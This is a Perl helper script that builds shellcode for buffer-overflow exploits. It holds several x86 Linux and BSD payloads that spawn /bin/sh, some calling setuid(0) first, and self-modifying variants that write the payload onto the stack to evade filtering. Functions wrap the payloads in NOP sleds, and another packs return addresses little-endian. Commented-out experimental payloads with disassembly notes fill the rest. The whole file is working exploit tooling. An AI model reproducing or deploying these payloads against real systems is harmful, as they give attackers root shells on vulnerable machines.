#!/usr/bin/perl -w



my @SHELLS;

push(@SHELLS,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68");


push(@SHELLS,"\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff/bin/sh\x00");


#from http://shellcode.org/Shellcode/BSD/bsd-shellcode.html
push(@SHELLS,"\x31\xc0\x50\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcc\x80");


# from $ebp in reverse
push(@SHELLS,"\xc7\x45\xd8" . "\x90\x90\x31\xc0" . "\xc7\x45\xdc" . "\x50\x50\x50\xb0" . "\xc7\x45\xe0" . "\x17\xcc\x80\x31" . "\xc7\x45\xe4" . "\xc0\x50\x68\x2f" . "\xc7\x45\xe8" . "\x2f\x73\x68\x68" . "\xc7\x45\xec" . "\x2f\x62\x69\x6e" . "\xc7\x45\xf0" . "\x89\xe3\x50\x54" . "\xc7\x45\xf4" . "\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xf8" . "\xfe\x45\xfe" . "\xfe\x45\xe1" . "\x8d\x55\xd8" . "\xff\xe2");

#from $ebp forward
push(@SHELLS,"\xc7\x45\x24" . "\x90\x90\x31\xc0" . "\xc7\x45\x28" . "\x50\x50\x50\xb0" . "\xc7\x45\x2c" . "\x17\xcc\x80\x31" . "\xc7\x45\x30" . "\xc0\x50\x68\x2f" . "\xc7\x45\x34" . "\x2f\x73\x68\x68" . "\xc7\x45\x38" . "\x2f\x62\x69\x6e" . "\xc7\x45\x3c" . "\x89\xe3\x50\x54" . "\xc7\x45\x40" . "\x53\x50\xb0\x3b" . "\xc7\x45\x44" . "\xcc\x80\x31\xc0" . "\xc7\x45\x48" . "\xb0\x01\xcc\x80" . "\xfe\x45\x44" . "\xfe\x45\x4a" . "\xfe\x45\x2d" . "\x8d\x55\x24" . "\xff\xe2");



#  23:   c7 44 24 04 c3 c9 80    movl   $0xcc80c9c3,0x4(%esp)
#  2a:   cc
#  2b:   fe 44 24 04             incb   0x4(%esp)
#  2f:   ff 54 24 04             call   *0x4(%esp)
#  33:   ff 64 24 04             jmp    *0x4(%esp)
#  37:   c7 44 24 fc c3 c9 80    movl   $0xcc80c9c3,0xfffffffc(%esp)
#  3e:   cc
#  3f:   8d 54 24 fc             lea    0xfffffffc(%esp),%edx
#  43:   fe 44 24 fc             incb   0xfffffffc(%esp)

# from $esp in reverse
push(@SHELLS,"\xc7\x44\x24\xd8" . "\x90\x90\x31\xc0" . "\xc7\x44\x24\xdc" . "\x50\x50\x50\xb0" . "\xc7\x44\x24\xe0" . "\x17\xcc\x80\x31" . "\xc7\x44\x24\xe4" . "\xc0\x50\x68\x2f" . "\xc7\x44\x24\xe8" . "\x2f\x73\x68\x68" . "\xc7\x44\x24\xec" . "\x2f\x62\x69\x6e" . "\xc7\x44\x24\xf0" . "\x89\xe3\x50\x54" . "\xc7\x44\24\xf4" . "\x53\x50\xb0\x3b" . "\xc7\x44\x24\xf8" . "\xcc\x80\x31\xc0" . "\xc7\x44\x24\xfc" . "\xb0\x01\xcc\x80" . "\xfe\x44\x24\xf8" . "\xfe\x44\x24\xfe" . "\xfe\x44\x24\xe1" . "\x8d\x54\x24\xd8" . "\xff\xe2");


#from $esp forward
push(@SHELLS,"\xc7\x44\x24\x08" . "\x90\x90\x31\xc0" . "\xc7\x44\x24\x0c" . "\x50\x50\x50\xb0" . "\xc7\x44\x24\x10" . "\x17\xcc\x80\x31" . "\xc7\x44\x24\x14" . "\xc0\x50\x68\x2f" . "\xc7\x44\x24\x18" . "\x2f\x73\x68\x68" . "\xc7\x44\x24\x1c" . "\x2f\x62\x69\x6e" . "\xc7\x44\x24\x20" . "\x89\xe3\x50\x54" . "\xc7\x44\x24\x24" . "\x53\x50\xb0\x3b" . "\xc7\x44\x24\x28" . "\xcc\x80\x31\xc0" . "\xc7\x44\x24\x2c" . "\xb0\x01\xcc\x80" . "\xfe\x44\x24\x28" . "\xfe\x44\x24\x2e" . "\xfe\x44\x24\x11" . "\x8d\x54\x24\x08" . "\xff\xe2");


sub genshell {

 my $shellno = shift || 1;
 my $size = shift || -1;
 my $front = shift || -1;

 my $diff = $size - length($SHELLS[$shellno-1]);
 $diff = 30 if ($size == -1);
 die("Too Small! Size=" . length($SHELLS[$shellno-1])) if ($diff < 0);

 if ($front == -1) {
  $front = $diff;
  $diff = 0;
 } else {
  $diff -= $front;
 }

 my $SHELLCODE = "\x90"x$front . $SHELLS[$shellno-1] . "\x90"x$diff;

# MY Own additions:
#   0:   c7 45 04 cc 80 c9 c3    movl   $0xcc80c9c3,0x4(%ebp)
#   7:   fe 45 04                incb   0x4(%ebp)
#   a:   ff 55 04                call   *0x4(%ebp)


# my $SHELLCODE = "\x90"x30 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\x04\xc3\xc9\x80\xcc\xfe\x45\x07\xff\x65\x04" . "\x31\xc0\xb0\x01\x90". "\x90"x2;

#  12:   c7 45 fc c3 c9 80 cc    movl   $0xcc80c9c3,0xfffffffc(%ebp)
#  19:   8d 55 fc                lea    0xfffffffc(%ebp),%edx
#  1c:   fe 45 fc                incb   0xfffffffc(%ebp)
#  1f:   ff e2                   jmp    *%edx
#  21:   c9                      leave
#  22:   c3                      ret

# my $SHELLCODE = "\x90"x30 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\xfc\xcc\x80\xc9\xc3\x8d\x55\xfc\xfe\x45\xfc\xff\xe2" . "\x31\xc0\xb0\x01\x90";

#        c7 45 f8 cc 80 31 c0    movl   $0xcc80c9c3,0xfffffff4(%ebp)
#        c7 45 fc b0 01 cc 80    movl	$0x31c0b001,0xfffffff8(%ebp)
#        fe 45 fa                incb   0xfffffffa(%ebp)
#        fe 45 ff                incb   0xffffffff(%ebp)
#        8d 55 f8                lea    0xfffffff8(%ebp),%edx
#        ff e2                   jmp    *%edx



# my $SHELLCODE = "\x90"x30 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xfa" . "\xfe\x45\xff" . "\x8d\x55\xf4" . "\xff\xe2"; 


# my $SHELLCODE = "\x90"x34 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xf8" . "\xfe\x45\xfe" . "\x8d\x55\xf8" . "\xff\xe2"; 

#  Now, let's put the whole code into arbitrary memory space.

# my $SHELLCODE = "\x90"x44 . "\xc7\x45\xd8" . "\x90\x90\x31\xc0" . "\xc7\x45\xdc" . "\x50\x50\x50\xb0" . "\xc7\x45\xe0" . "\x17\xcc\x80\x31" . "\xc7\x45\xe4" . "\xc0\x50\x68\x2f" . "\xc7\x45\xe8" . "\x2f\x73\x68\x68" . "\xc7\x45\xec" . "\x2f\x62\x69\x6e" . "\xc7\x45\xf0" . "\x89\xe3\x50\x54" . "\xc7\x45\xf4" . "\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xf8" . "\xfe\x45\xfe" . "\xfe\x45\xe1" . "\x8d\x55\xd8" . "\xff\xe2"; 

 return($SHELLCODE);
}

sub genshell2 {
 my $SHELLCODE = "\x90"x30 . "\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff/bin/sh\x00";

# my $SHELLCODE = "\x90"x16 . "\x31\xc0\x50\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"; 

# MY Own additions:
#   0:   c7 45 04 c3 c9 80 cc    movl   $0xcc80c9c3,0x4(%ebp)
#   7:   fe 45 04                incb   0x4(%ebp)
#   a:   ff 55 04                call   *0x4(%ebp)


 #my $SHELLCODE = "\x90"x16 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\x04\xc3\xc9\x80\xcc\xfe\x45\x07\xff\x55\x04" . "\x31\xc0\xb0\x01\x90". xw("0x2814dd00") . "\xCC\x90";


 return($SHELLCODE);
}

sub xw {
 my $address = shift;
 my $ret = "";

 if (substr($address,1,1) eq "x"){ $address = substr($address,2);}
 if (substr($address,0,1) eq "x"){ $address = substr($address,1);}

 for ( my $i = length($address); $i>0 ; $i=$i-2){
  my $byte = substr($address, $i-2, 2);
  $ret .= chr(hex($byte));
 }
 return $ret;
}

#print(xw(shift));

